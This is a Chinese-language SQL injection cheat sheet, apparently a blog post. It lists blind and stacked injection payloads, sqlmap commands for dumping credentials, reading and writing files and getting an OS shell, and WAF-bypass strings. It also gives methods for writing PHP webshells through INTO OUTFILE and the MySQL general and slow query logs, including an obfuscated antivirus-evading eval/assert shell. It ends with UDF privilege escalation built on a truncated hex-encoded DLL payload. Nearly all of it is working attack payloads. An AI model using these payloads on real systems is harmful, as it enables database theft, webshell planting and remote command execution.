class="hljs-attribute">1</span>&#x27; and if(length(database())&gt;<span class="hljs-number">1</span>,sleep(<span class="hljs-number">5</span>),<span class="hljs-number">1</span>)--+<br><span class="hljs-attribute">1</span>&#x27; and if(substr(database(),<span class="hljs-number">1</span>,<span class="hljs-number">1</span>)=&#x27;s&#x27;,sleep(<span class="hljs-number">5</span>),<span class="hljs-number">1</span>)--+<br><span class="hljs-comment">#用ascii码的好处：MYSQL不区分大小写&#x27;s&#x27;=&#x27;S&#x27;为真</span><br><span class="hljs-attribute">1</span>&#x27; and if(ord(substr(database(),<span class="hljs-number">1</span>,<span class="hljs-number">1</span>))=<span class="hljs-number">114</span>,sleep(<span class="hljs-number">5</span>),<span class="hljs-number">1</span>)--+<br></code></pre></td></tr></table></figure><h3 id="堆叠注入">堆叠注入</h3><figure class="highlight gauss"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs gauss"><span class="hljs-number">1</span>&#x27;;<span class="hljs-keyword">show</span> databases<span class="hljs-meta">#</span><br><span class="hljs-number">1</span>;<span class="hljs-keyword">show</span> databases<span class="hljs-meta">#</span><br><span class="hljs-number">1</span>;<span class="hljs-keyword">show</span> databases;<br><span class="hljs-number">1</span>&#x27;;<span class="hljs-keyword">show</span> tables<span class="hljs-meta">#</span><br><span class="hljs-number">1</span>&#x27;;<span class="hljs-keyword">show</span> columns from words<span class="hljs-meta">#</span><br></code></pre></td></tr></table></figure><h3 id="改表字段名">改表、字段名</h3><p>有words表和1919810931114514表情况下</p><pre><code class="hljs">1. 将表words的名称改为其他的（如words1），2. 将1919810931114514改为words.3. 将flag改为id,4. 在输入栏中输入1&#39; or 1=1,将其中的数据全部输出，即为flag.</code></pre><p>语句：</p><figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs pgsql"><span class="hljs-keyword">rename</span> <span class="hljs-keyword">tables</span> words <span class="hljs-keyword">to</span> words1 ;<br><span class="hljs-keyword">rename</span> <span class="hljs-keyword">tables</span> <span class="hljs-number">1919810931114514</span> <span class="hljs-keyword">to</span> words ;<br><span class="hljs-keyword">alter</span> <span class="hljs-keyword">table</span> words change flag id <span class="hljs-type">varchar</span>(<span class="hljs-number">100</span>);#<br></code></pre></td></tr></table></figure><p>sqlmap使用</p><p>参考资料：https://blog.csdn.net/u011377996/article/details/81368482sql注入的防御： https://blog.51cto.com/u_12332766/2137035https://www.freebuf.com/vuls/265308.html</p><figure class="highlight jboss-cli"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><code class="hljs jboss-cli">常用语句：<br>判断是否存在注入 sqlmap -u http:<span class="hljs-string">//127.0.0.1/sqli-labs/Less-1/</span>?id=1<br>读取日志的请求进行检测 sqlmap -l request.txt<br>查询当前的所有数据库 sqlmap.py -u http:<span class="hljs-string">//127.0.0.1/sqli-labs/Less-1/</span>?id=1 <span class="hljs-params">--dbs</span><br>获取数据库下的表名 sqlmap.py -u http:<span class="hljs-string">//127.0.0.1/sqli-labs/Less-1/</span>?id=1 -D security <span class="hljs-params">--tables</span><br>获取表中的字段名 sqlmap.py -u http:<span class="hljs-string">//127.0.0.1/sqli-labs/Less-1/</span>?id=1 -D security -T users <span class="hljs-params">--columns</span><br>获取字段的内容 sqlmap.py -u http:<span class="hljs-string">//127.0.0.1/sqli-labs/Less-1/</span>?id=1 -D security -T users -C username,password <span class="hljs-params">--dump</span><br>获取数据库的所有用户 sqlmap.py -u http:<span class="hljs-string">//127.0.0.1/sqli-labs/Less-1/</span>?id=1 <span class="hljs-params">--users</span><br>获取数据库用户的密码 sqlmap.py -u http:<span class="hljs-string">//127.0.0.1/sqli-labs/Less-1/</span>?id=1 <span class="hljs-params">--password</span><br>获取当前数据库的名称 sqlmap.py -u http:<span class="hljs-string">//127.0.0.1/sqli-labs/Less-1/</span>?id=1 <span class="hljs-params">--current-db</span><br>获取当前数据库的用户 sqlmap.py -u http:<span class="hljs-string">//127.0.0.1/sqli-labs/Less-1/</span>?id=1 <span class="hljs-params">--current-user</span><br>sqlmap获取数据库名、数据库表、数据库字段<br>sqlmap -u http:<span class="hljs-string">//127.0.0.1/sqli-labs/Less-1/</span>?id=1 <span class="hljs-params">--current-db</span><br>sqlmap -u http:<span class="hljs-string">//127.0.0.1/sqli-labs/Less-1/</span>?id=1 -D security <span class="hljs-params">--tables</span><br>sqlmap -u http:<span class="hljs-string">//127.0.0.1/sqli-labs/Less-1/</span>?id=1 -D security -T users <span class="hljs-params">--columns</span><br>获取指定表中的数据 sqlmap -u http:<span class="hljs-string">//127.0.0.1/sqli-labs/Less-1/</span>?id=1 -D security -T users <span class="hljs-params">--dump</span><br>获取所有表的数据 sqlmap -u http:<span class="hljs-string">//127.0.0.1/sqli-labs/Less-1/</span>?id=1 <span class="hljs-params">--dump-all</span><br>sqlmap读取系统文件 sqlmap -u http:<span class="hljs-string">//192.168.75.141/sqli-labs/Less-1/</span>?id=1 <span class="hljs-params">--file-read=/etc/os-release</span><br>sqlmap写入系统文件 sqlmap -u http:<span class="hljs-string">//192.168.75.141/sqli-labs/Less-1/</span>?id=1 <span class="hljs-params">--file-write=/root/test</span>.php <span class="hljs-params">--file-dest=/var/www/html/test</span>.php<br>sqlmap执行系统命令 sqlmap -u http:<span class="hljs-string">//192.168.75.141/sqli-labs/Less-1/</span>?id=1 <span class="hljs-params">--os-shell</span><br><br>参数：<br><br><span class="hljs-params">--level</span> 探测等级：1-5，默认为1，等级越高，payload越多，速度越慢。HTTP cookei在level为2时就会测试，HTTP User-Agent/Referer在level为3时就会测试。<br><span class="hljs-params">--risk</span> 危险登录：1-3，默认为1，等级越高，越可能对数据库造成破坏<br><span class="hljs-params">--id-dba</span> 确认当前用户为管理权限（是否为root权限，mssql下最高权限为sa）<br><span class="hljs-params">--sql-shell</span> 运行自定义sql语句<br><span class="hljs-params">--os-cmd</span>,<span class="hljs-params">--os-shell</span> 运行任意操作系统命令<br><span class="hljs-params">--file-read</span> 从数据库服务器中读取文件<br><span class="hljs-params">--file-write</span> 上传文件到数据库服务器中<br><span class="hljs-params">--flush-session</span> 清空已保存的会话信息<br><span class="hljs-params">--dbs</span> 所有数据库<br><span class="hljs-params">--current-db</span> 网站当前数据库<br><span class="hljs-params">--users</span> 所有数据库用户<br><span class="hljs-params">--current-user</span> 当前数据库用户<br><span class="hljs-params">--random-agent</span> 构造随机user-agent<br><span class="hljs-params">--passwords</span> 数据库密码<br><span class="hljs-params">--proxy</span> http:<span class="hljs-string">//local</span><span class="hljs-function">:8080</span> –threads 10 <span class="hljs-params">(可以自定义线程加速)</span> 代理<br><span class="hljs-params">--time-sec=TIMESEC</span> DBMS响应的延迟时间（默认为5秒)<br><span class="hljs-params">--threads=</span> 使用多少线程<br></code></pre></td></tr></table></figure><h2 id="bypass-waf">Bypass waf</h2><p>绕过and、or</p><figure class="highlight 1c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs 1c">if((<span class="hljs-number">1</span>=<span class="hljs-number">1</span>),<span class="hljs-number">1</span>,<span class="hljs-number">2</span>)<br><span class="hljs-string">||</span><br><span class="hljs-meta">&amp;&amp;</span><br></code></pre></td></tr></table></figure><p>绕过空格</p><figure class="highlight gcode"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs gcode"><span class="hljs-meta">%</span><span class="hljs-number">0</span>a<br><span class="hljs-comment">/**/</span><br></code></pre></td></tr></table></figure><p>绕过order by</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk"><span class="hljs-number">1</span><span class="hljs-regexp">/**/</span>order<span class="hljs-regexp">/*/</span><span class="hljs-regexp">//</span><span class="hljs-regexp">//</span><span class="hljs-regexp">/*/</span>by <span class="hljs-number">3</span><br></code></pre></td></tr></table></figure><p>绕过union select</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs awk"><span class="hljs-number">1</span><span class="hljs-regexp">/**/u</span>nion<span class="hljs-regexp">/*/</span><span class="hljs-regexp">//</span><span class="hljs-regexp">//</span><span class="hljs-regexp">/*/</span><span class="hljs-regexp">/*!50441select*/</span> <span class="hljs-number">1</span>,<span class="hljs-number">2</span>,<span class="hljs-number">3</span><br>unIon<br>selECt<br></code></pre></td></tr></table></figure><p>绕过database(),user()</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk"><span class="hljs-number">1</span><span class="hljs-regexp">/**/u</span>nion<span class="hljs-regexp">/*/</span><span class="hljs-regexp">//</span><span class="hljs-regexp">//</span><span class="hljs-regexp">/*/</span><span class="hljs-regexp">/*!50441select*/</span> <span class="hljs-number">1</span>,database(<span class="hljs-regexp">/*/</span><span class="hljs-regexp">//</span>*<span class="hljs-regexp">/),user(/</span>*<span class="hljs-regexp">//</span><span class="hljs-regexp">/*/</span>)<br></code></pre></td></tr></table></figure><p>获取表名</p><figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs pgsql"><span class="hljs-number">1</span><span class="hljs-comment">/**/</span><span class="hljs-keyword">union</span><span class="hljs-comment">/*//////*/</span><span class="hljs-comment">/*!50441select*/</span> <span class="hljs-number">1</span>,<span class="hljs-number">2</span>,group_concat(<span class="hljs-built_in">table_name</span>) <span class="hljs-keyword">from</span> information_schema.<span class="hljs-keyword">tables</span> <span class="hljs-keyword">where</span> table_schema=<span class="hljs-keyword">database</span>(<span class="hljs-comment">/*///*/</span>)<br></code></pre></td></tr></table></figure><p>获取列名</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk"><span class="hljs-number">1</span><span class="hljs-regexp">/**/u</span>nion<span class="hljs-regexp">/*/</span><span class="hljs-regexp">//</span><span class="hljs-regexp">//</span><span class="hljs-regexp">/*/</span><span class="hljs-regexp">/*!50441select*/</span>%<span class="hljs-number">201</span>,<span class="hljs-number">2</span>,group_concat(column_name) from information_schema.columns where%<span class="hljs-number">20</span>table_schema=database(<span class="hljs-regexp">/*/</span><span class="hljs-regexp">//</span>*<span class="hljs-regexp">/) and/</span>*<span class="hljs-regexp">//</span><span class="hljs-regexp">//</span><span class="hljs-regexp">/*/</span>table_name=<span class="hljs-string">&quot;admin&quot;</span><br></code></pre></td></tr></table></figure><p>获取数据</p><figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs pgsql"><span class="hljs-number">1</span><span class="hljs-comment">/**/</span><span class="hljs-keyword">union</span><span class="hljs-comment">/*//////*/</span><span class="hljs-comment">/*!50441select*/</span> <span class="hljs-number">1</span>,group_concat(<span class="hljs-keyword">password</span>),group_concat(username) <span class="hljs-keyword">from</span> <span class="hljs-keyword">admin</span><br></code></pre></td></tr></table></figure><p>fuzz</p><h2 id="mysql写shell提权">mysql写shell、提权</h2><h3 id="shell">shell</h3><p>一般情况下 Linux 系统下面权限分配比较严格，MySQL用户一般情况下是无法直接往站点根目录写入文件的，在 Windows环境下成功率会很高。</p><h4 id="outfile和dumpfile">outfile和dumpfile</h4><p>条件</p><ol type="1"><li><p>要知道网站绝对路径，可以通过报错，phpinfo界面，404界面等一些方式知道</p></li><li><p>gpc为off，on的话单引号被转义了，语句就不能正常执行了</p></li><li><p>要有file权限，默认情况下只有root有</p></li></ol><p><code>select user,file_priv from mysql.user;</code></p><ol start="4" type="1"><li><p>对目录要有写权限</p></li><li><p><code>secure_file_priv</code>的值非NULL或为导出的绝对路径</p></li></ol><p>​secure_file_priv的值在mysql配置文件my.ini中设置，这个参数用来限制数据导入导出​Mysql&gt;=5.5.53 默认为NULL，即默认禁止导入导出 ​ Mysql&lt;5.5.53默认为空，即默认无限制</p><p>​ <code>show global variables like '%secure_file_priv%';</code></p><h4 id="union">union</h4><figure class="highlight php-template"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs php-template"><span class="language-xml">?id=1&#x27; union select 1,&#x27;</span><span class="language-php"><span class="hljs-meta">&lt;?php</span> <span class="hljs-title function_ invoke__">phpinfo</span>();<span class="hljs-meta">?&gt;</span></span><span class="language-xml">&#x27;,3 into outfile &#x27;C:/shell.php&#x27;%23</span><br><span class="language-xml">?id=1&#x27; union select 1,&#x27;</span><span class="language-php"><span class="hljs-meta">&lt;?php</span> <span class="hljs-title function_ invoke__">phpinfo</span>();<span class="hljs-meta">?&gt;</span></span><span class="language-xml">&#x27;,3 into dumpfile &#x27;C:/shell.php&#x27;%23</span><br><span class="language-xml"></span><br><span class="language-xml">hex</span><br><span class="language-xml">id=-1&#x27; union select 1,0x3c3f70687020706870696e666f28293b3f3e,3 into outfile &quot;C:/shell.php&quot;%23</span><br></code></pre></td></tr></table></figure><h4 id="非union">非union</h4><p>使用<code>fields terminated by</code>与<code>lines terminated by</code>写shell</p><figure class="highlight php-template"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs php-template"><span class="language-xml">?id=1 into outfile &#x27;C:/info.php&#x27; FIELDS TERMINATED BY &#x27;</span><span class="language-php"><span class="hljs-meta">&lt;?php</span> <span class="hljs-title function_ invoke__">phpinfo</span>();<span class="hljs-meta">?&gt;</span></span><span class="language-xml">&#x27;%23</span><br><span class="language-xml">?id=1 into outfile &#x27;C:/info.php&#x27; FIELDS TERMINATED BY 0x3c3f70687020706870696e666f28293b3f3e %23</span><br><span class="language-xml">?id=1 into outfile &#x27;C:/info.php&#x27; lines terminated by &#x27;</span><span class="language-php"><span class="hljs-meta">&lt;?php</span> <span class="hljs-title function_ invoke__">phpinfo</span>();<span class="hljs-meta">?&gt;</span></span><span class="language-xml">&#x27;%23</span><br><span class="language-xml">?id=1 into outfile &#x27;C:/info.php&#x27; lines terminated by 0x3c3f70687020706870696e666f28293b3f3e %23</span><br></code></pre></td></tr></table></figure><h4 id="outfile和dumpfile的区别">outfile和dumpfile的区别</h4><p><strong>outfile</strong></p><figure class="highlight arcade"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs arcade">支持多行数据同时导出<br>使用<span class="hljs-built_in">union</span>联合查询时，要保证两侧查询的列数相同<br>会在换行符制表符后面追加反斜杠<br>会在末尾追加换行(所以不能直接写入二进制文件)<br></code></pre></td></tr></table></figure><p><strong>dumpfile</strong></p><figure class="highlight gradle"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs gradle">每次只能导出一行数据<br>不会在换行符制表符后面追加反斜杠<br>不会在末尾追加换行<br>如果服务器端本身的查询语句，结果有多行，但是我们又想使用<span class="hljs-keyword">dump</span> <span class="hljs-keyword">file</span>，应该手动添加 limit 限制<br></code></pre></td></tr></table></figure><h3 id="日志写shellgeneral_log">日志写shell(general_log)</h3><p><code>secure_file_priv</code> Mysql&gt;=5.5.53默认为NULL，即默认禁止导入导出 Mysql&lt;5.5.53默认为空，即默认无限制</p><p>在5.5.53版本后无法用sql语句修改<code>secure_file_priv</code>，利用日志将shell写入日志中</p><p>条件</p><ol type="1"><li><p>对目录要有写权限</p></li><li><p>高权限运行 MySQL 或者 Apache</p></li></ol><figure class="highlight php-template"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs php-template"><span class="language-xml">查看配置，日志是否开启，和mysql默认log地址(记下原地址方便恢复)</span><br><span class="language-xml">show variables like &#x27;%general%&#x27;;</span><br><span class="language-xml">开启日志监测，默认关闭(如果一直开文件会很大的)</span><br><span class="language-xml">set global general_log = on;</span><br><span class="language-xml">设置日志路径</span><br><span class="language-xml">set global general_log_file = &#x27;/var/www/html/info.php&#x27;;</span><br><span class="language-xml">执行查询，写入shell</span><br><span class="language-xml">select &#x27;</span><span class="language-php"><span class="hljs-meta">&lt;?php</span> <span class="hljs-title function_ invoke__">phpinfo</span>();<span class="hljs-meta">?&gt;</span></span><span class="language-xml">&#x27;;</span><br><span class="language-xml">结束后，恢复日志路径，关闭日志监测</span><br><span class="language-xml">set global general_log = off;</span><br><span class="language-xml"></span><br><span class="language-xml">SQL查询免杀shell</span><br><span class="language-xml">select &quot;</span><span class="language-php"><span class="hljs-meta">&lt;?php</span> <span class="hljs-variable">$sl</span> = <span class="hljs-title function_ invoke__">create_function</span>(<span class="hljs-string">&#x27;&#x27;</span>, @<span class="hljs-variable">$_REQUEST</span>[<span class="hljs-string">&#x27;cmd&#x27;</span>]);<span class="hljs-variable">$sl</span>();<span class="hljs-meta">?&gt;</span></span><span class="language-xml">&quot;;</span><br><span class="language-xml"></span><br><span class="language-xml">SELECT &quot;</span><span class="language-php"><span class="hljs-meta">&lt;?php</span> <span class="hljs-variable">$p</span> = <span class="hljs-keyword">array</span>(<span class="hljs-string">&#x27;f&#x27;</span>=&gt;<span class="hljs-string">&#x27;a&#x27;</span>,<span class="hljs-string">&#x27;pffff&#x27;</span>=&gt;<span class="hljs-string">&#x27;s&#x27;</span>,<span class="hljs-string">&#x27;e&#x27;</span>=&gt;<span class="hljs-string">&#x27;fffff&#x27;</span>,<span class="hljs-string">&#x27;lfaaaa&#x27;</span>=&gt;<span class="hljs-string">&#x27;r&#x27;</span>,<span class="hljs-string">&#x27;nnnnn&#x27;</span>=&gt;<span class="hljs-string">&#x27;t&#x27;</span>);<span class="hljs-variable">$a</span> = <span class="hljs-title function_ invoke__">array_keys</span>(<span class="hljs-variable">$p</span>);<span class="hljs-variable">$_</span>=<span class="hljs-variable">$p</span>[<span class="hljs-string">&#x27;pffff&#x27;</span>].<span class="hljs-variable">$p</span>[<span class="hljs-string">&#x27;pffff&#x27;</span>].<span class="hljs-variable">$a</span>[<span class="hljs-number">2</span>];<span class="hljs-variable">$_</span>= <span class="hljs-string">&#x27;a&#x27;</span>.<span class="hljs-variable">$_</span>.<span class="hljs-string">&#x27;rt&#x27;</span>;<span class="hljs-variable">$_</span>(<span class="hljs-title function_ invoke__">base64_decode</span>(<span class="hljs-variable">$_REQUEST</span>[<span class="hljs-string">&#x27;cmd&#x27;</span>]));<span class="hljs-meta">?&gt;</span></span><span class="language-xml">&quot;;</span><br></code></pre></td></tr></table></figure><h3id="慢查询getshellslow_query_log">慢查询getshell(slow_query_log)</h3><p>如果是普通日志，开启日志监测后文件会很大，网站访问量大的话我们写的shell会出错</p><p>使用慢查询日志时，只有当查询时间超过系统时间时才会记录在日志中</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs sql">查看慢查询信息是否开启<br><span class="hljs-keyword">show</span> variables <span class="hljs-keyword">like</span> <span class="hljs-string">&#x27;%slow_query_log%&#x27;</span>;<br>启用慢查询日志(默认禁用)<br><span class="hljs-keyword">set</span> <span class="hljs-keyword">global</span> slow_query_log<span class="hljs-operator">=</span><span class="hljs-number">1</span>;<br>修改日志文件路径<br><span class="hljs-keyword">set</span> <span class="hljs-keyword">global</span> slow_query_log_file<span class="hljs-operator">=</span><span class="hljs-string">&#x27;C:\\phpStudy\\WWW\\shell.php&#x27;</span>;<br>查看写入慢日志的时间要求<br><span class="hljs-keyword">show</span> <span class="hljs-keyword">global</span> variables <span class="hljs-keyword">like</span> <span class="hljs-string">&#x27;%long_query_time%&#x27;</span>        <br>执行查询，写入shell<br><span class="hljs-keyword">select</span> <span class="hljs-string">&#x27;&lt;?php @eval($_POST[abc]);?&gt;&#x27;</span> <span class="hljs-keyword">or</span> sleep(<span class="hljs-number">11</span>);<br></code></pre></td></tr></table></figure><h2 id="udf提权">udf提权</h2><p><code>user defined function</code>，用户自定义函数，是数据库功能的一种扩展。用户通过自定义函数可以实现在MySQL 中无法方便实现的功能，其添加的新函数都可以在 SQL语句中调用，就像调用本机函数 version () 等方便。</p><p>udf在<code>mysql&gt;=5.1</code>的版本中，存在于<code>mysql/lib/plugin</code>目录下，文件后缀为.dll，常用c语言编写。</p><h4 id="流程">流程</h4><figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs pgsql">查看secure_file_priv<br><span class="hljs-keyword">show</span> variables <span class="hljs-keyword">like</span> <span class="hljs-string">&#x27;%secure_file_priv%&#x27;</span>;<br>查看插件目录<br><span class="hljs-keyword">show</span> variables <span class="hljs-keyword">like</span> <span class="hljs-string">&#x27;%plugin%&#x27;</span>;<br>如果没有，手工创建（mysql5<span class="hljs-number">.1</span>以后基本不可能成功）<br><span class="hljs-keyword">select</span> <span class="hljs-number">1</span> <span class="hljs-keyword">into</span> dumpfile <span class="hljs-string">&#x27;D:\\env\\php\\phpstudy_pro\\Extensions\\MySQL5.7.26\\lib\\plugin::$index_allocation&#x27;</span>;<br>上传dll后，创建自定义函数<br><span class="hljs-keyword">create</span> <span class="hljs-keyword">function</span> sys_eval <span class="hljs-keyword">returns</span> string soname <span class="hljs-string">&#x27;lib_mysqludf_sys_64.dll&#x27;</span>;<br>导入成功后查看一下mysql函数里面是否新增了sys_eval函数：<br><span class="hljs-keyword">select</span> * <span class="hljs-keyword">from</span> mysql.func <span class="hljs-keyword">where</span> <span class="hljs-type">name</span> = <span class="hljs-string">&#x27;sys_eval&#x27;</span>;<br>执行命令<br><span class="hljs-keyword">select</span> sys_eval(<span class="hljs-string">&#x27;whoami&#x27;</span>);<br>删除函数<br><span class="hljs-keyword">drop</span> <span class="hljs-keyword">function</span> sys_eval;<br></code></pre></td></tr></table></figure><p>这里注意如果有webshell可以直接上传dll或so文件就直接上传即可</p><p>如果有注入，但是无webshell，可以利用sqlmap，因为 GET有<strong>字节长度限制</strong>，所以往往 POST注入才可以执行这种攻击</p><figure class="highlight abnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs abnf">sqlmap -u  <span class="hljs-string">&quot;http://localhost:3306/&quot;</span> --data<span class="hljs-operator">=</span><span class="hljs-string">&quot;id=1&quot;</span> --file-write<span class="hljs-operator">=</span><span class="hljs-string">&quot;./lib_mysqludf_sys_64.so&quot;</span>  --file-dest<span class="hljs-operator">=</span><span class="hljs-string">&quot;/usr/lib/mysql/plugin/udf.so&quot;</span>  <br></code></pre></td></tr></table></figure><p>如果没有注入，但可以操作原生sql语句，例如进入phpmyadmin中</p><p>利用16进制intodumpfile写入，具体payload查询：https://www.sqlsec.com/tools/udf.html</p><figure class="highlight taggerscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs taggerscript">直接 SELECT 查询十六进制写入<br>SELECT 0x4d5a90000300000004000000ffff0000b800000000000000400000000000000000000000000000000000000000000000000000000000000000000000f80000000e1fba0e00b409cd21b8014ccd21546869732070726f6772616d2063616e6e6f742062652072756e20696e20444f53206d6f64652e0d0d0a24000000000000004d477bd0092615830926158309261583005e86830b261583005e808308261583005e968307261583005e91830b2615832ee06e830a2615830926148325261583005e9c8308261583005e878308261583005e8483082615835269636809261583000000000000000000000000000000000000000000000000504500004c0103004afe9f5a0000000000000000e00002210b010900001000000010000000600000607c0000007000000080000000000010001000000002000005000000000000000500000000000000009000000010000000000000020000000000100000100000000010000010000000000000100000007c83000008020000b4820000c800000000800000b402000000000000000000000000000000000000848500001000000000000000000000000000000000000000000000000000000000000000000000002c7e00004800000000000000000000000000000000000000000000000000000000000000000000000000000000000000555058300000000000600000001000000000000000040000000000000000000000000000800000e0555058310000000000100000007000000010000000040000000000000000000000000000400000e02e7273726300000000100000008000000006000000140000000000000000000000000000400000c00000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000332e393100555058210d090208b92bcf11b11ceea24f550000560c000000220000260000a8ffffffff8b4c240833c03901741656578b7c24146a0c59be000010dcf3a566a55fb0015e5dfb77fbc38b44240c1a6a071611108bf8183218ff63db6f1ca45fc7011e1200210883380175128b40040df6776f0700750a1004c6000132c0c3530abf1df68d3c3053a454082d08ff30ff15fff6ee776c885985c075085614c601011bc8568d71018a11fd6fdffe4184d275f98b54142bce890a32558bec8b4d0c833902b7d860bf5374148b7d10915c5453eb4cbf9dbddf8b417d740f1b707c1bebe5836004dbb1ffb7001a0c8b48048b008d4401025072a0594c08dfc8d7b5891678113006a44ceb6c57beb7b2b85f5e5da30421740833dbb63ff6a8591353568b742410d878534602db85db5bb6460851c78d5c4257e8240b75eeeebfe01400c604070008ff70041e0553b1db1b921a22c418535720030054090f09b7086a995b0f98599954cf2d343713b8f4540b1edeb60d818403552251519d35dffed6fedf576800f762d66a018945fc068bf08b4560dd7ff70cc606004533ff595939387471683cc071c6fedfda9c12260c3bc7745b506a04ff75fc149073e1edd7a9fd48533afc8d48911040b963dbff2bc18bd88d043b505630f8268c5330d8ad8dbd5f03fe570e940de57df8463fe6364c2066ba5b1810a4803e0059169eb0ff741a8bc6c64437ff00594d1489c906987bebd86f183e5f205ec9c3eed7b235dcbaf37d574708c45030087bdbdacdc9c26a4078c710548d4601b9e07e614251724f0856ff31cf6bafdd9db694c66aff8dc32082f63a58b0b6030d092c23005f7cc36e57036c6a081d1290ac0aa88365fc2f6c2f2c2d4592d0eb071b408f65e8c70bbfd66e42feff000d1fedc25e3bffdb17b60d08209a02f3c3e90806f58bff56688000002d8c6d675880985608845aa3bde0febb062358045485f675054daa83260076fbb7db4508c36f08ed09acc704240607ff0b4c113637598d71ffcf9c0bbf77dfc9750e39056b107e3cff7310830b01fbeec6bb8b0910548b098f57890a23480f85d47d618cbbad641718068b79040838071b76edeebb1e50eb184aa705b8e61768b0b030d8e803a83c0957c1d6bbaeb5d6a1e7e9e2573ca12f4c6a6ff777c3025efd096a1fee76eb3caa10c80475ed7befc0c7051f281a70e027071bdff79d5cb520bc04b81b6a5635b952eb782b7339b2e3696ff7defd7340393d155c741c68062809ac43db6b85850d9e1034252316ffe666f862f154b201dc0801592cc2b1a1db78049ddfdbf62413d90fd4fc83f80266b16f6cb0d2595bffa0584b77783bb5783106350f8487c71996ee4cd3543bf81810897d82efc796be35fac87251833f8af36a7c398587b4f10774e9ffc8d60f7c89c5db9bb5d955f85615441b474ded5be38ef88a394d1003d00874b48909437aa36d020c1ad3f8eba71c3162cc5a64442e386161fb0a58064c32fc19503f1bdf720443375bc9c20cc710fb02231fb2288b2ef28b5d081cae0fdb9b54e433c95cfc7d2008016c2dc6c23bf15a393a4417e4d61bfe7fafae3bf0740583fe02752e1910d03bc1e7166eb8ed57565fd03b5ee40003937b703b67115a039614168012376c7d270a8227fea0246420575062b30d661327002f527f8df61ad2061153f76a037543b067bb614f34032168742e2c0d2c3cec257feb1b71ec5a09706a7c6faae05051597c64825d900eadf62ffa8a19066b8f91b6c72ae490c396ec1640e134a9ff3b246abb41c1f17926547dbc550c0d381e33bc05bc595d382281ec2832f7869f365f212043211c895e2118891d05f78ec243143c21a2aa210c668c186c5ffbda3806252c0620080605dd2dcdd20425002d7ffc9c8f7ab6b1f6143095562407042831d6fedb7f0807348b85e0fca0aa701d